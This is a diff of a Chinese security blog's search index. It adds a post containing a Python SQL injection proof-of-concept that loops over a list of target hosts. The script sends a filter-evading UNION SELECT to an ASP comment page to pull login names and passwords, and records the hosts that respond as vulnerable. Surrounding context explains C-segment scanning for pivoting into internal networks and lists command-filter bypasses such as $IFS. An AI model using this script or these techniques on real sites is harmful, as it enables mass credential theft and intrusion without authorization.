@@ -1,9 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQL注入漏洞_poc</title>
+    <url>/2023/02/25/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-poc/</url>
+    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payload_windos = <span class="string">&#x27;/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20&#123;prefix&#125;user&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;check-&gt;&#x27;</span>+ip)</span><br><span class="line">        ip = ip.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        url = ip</span><br><span class="line">        data_windows = requests.get(url+payload_windos,verify=<span class="literal">False</span>).status_code<span class="comment">#请求状态码</span></span><br><span class="line">        <span class="keyword">if</span>  data_windows == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;vuln.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                ip = ip.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                ip = ip.replace(<span class="string">&quot;https://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                f.write(ip+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>直接拼接注入语句，然后遍历ip.txt文件中的所有ip，然后将验证成功的ip写入vuln.txt文件</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>poc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>c段信息收集</title>
     <url>/2023/02/24/c%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h2 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h2><p>IP地址分为A类，B类，C类等。A类的网络位为8位，主机位24位；B类的网络位为16位，主机位16位；C类的网络位为24位，主机位8位。</p>
+<span id="more"></span>
+
 <p>通过对C类IP的主机位进行遍历，查找在同一网络位的情况下，存活那些主机，就是C段扫描，</p>
 <p>C段主机是指与目标服务器在同一C段网络的服务器，攻击目标的C段存活主机是信息收集的重要步骤，很多企业的内部服务器可能都会在一个C段网络中，在很难找到攻击目标服务器互联网漏洞的情况下，可以通过攻击C段主机，获取对C段主机的控制权，进入企业内网环境中，在企业内网安全隔离以及安全防护不如互联网防护健全的情况下，可以通过C段的主机进行内网渗透，这样可以绕过互联网防护机制，对目标进行攻击</p>
 <p>参考文章：</p>
@@ -122,7 +140,7 @@
 <p>9、$IFS符号</p>
 <p>10、以及过滤掉的内容</p>
 <h4 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord() 函数"></a>ord() 函数</h4><p>ord() 函数:返回字符串的首个字符的 ASCII 值。</p>
-<h4 id="REQUEST、-POST、-GET的区别和联系"><a href="#REQUEST、-POST、-GET的区别和联系" class="headerlink" title="$_REQUEST、$_POST、$_GET的区别和联系"></a>$_REQUEST、$_POST、$_GET的区别和联系</h4><ol>
+<h4 id="REQUEST、-POST、-GET的区别和联系"><a href="#REQUEST、-POST、-GET的区别和联系" class="headerlink" title="$_REQUEST、$_POST、$_GET的区别和联系"></a><code>$_REQUEST</code>、<code>$_POST</code>、<code>$_GET</code>的区别和联系</h4><ol>
 <li><code>$_REQUEST</code></li>
 </ol>
 <p>PHP中，<code>$_REQUEST</code>可以获取POST方法和GET方法提交的数据，但是传输的速度相对较慢。</p>
